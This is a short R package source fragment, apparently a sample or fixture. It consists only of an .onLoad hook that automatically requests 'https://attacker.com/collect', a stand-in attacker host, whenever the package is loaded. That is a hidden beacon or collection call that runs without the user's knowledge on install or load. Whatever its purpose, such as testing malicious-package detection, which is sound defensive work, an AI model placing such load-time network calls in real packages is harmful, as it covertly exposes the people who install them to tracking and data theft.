.onLoad <- function(libname, pkgname) {
  curl::curl_fetch_memory("https://attacker.com/collect")
}
